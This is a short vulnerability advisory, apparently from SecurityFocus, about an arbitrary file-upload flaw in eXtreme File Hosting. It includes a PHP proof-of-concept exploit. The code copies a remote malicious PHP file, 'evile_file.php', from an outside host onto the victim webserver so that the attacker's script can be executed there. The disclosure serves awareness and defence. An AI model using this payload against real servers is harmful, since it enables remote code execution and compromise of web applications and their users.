source: http://www.securityfocus.com/bid/22498/info

eXtreme File Hosting is prone to an arbitrary file-upload vulnerability because it fails to sufficiently sanitize user-supplied input.

Exploiting this issue could allow an attacker to upload and execute arbitrary PHP script code in the context of the affected webserver process. This may help the attacker compromise the application; other attacks are possible. 

<?php
$file = 'http://sample.com/evile_file.php';
$newfile = 'evile_file.php';
if (!copy($file, $newfile)) {
   echo "failed to copy $file...\n";
}else{
   echo "OK file copy in victim host";
}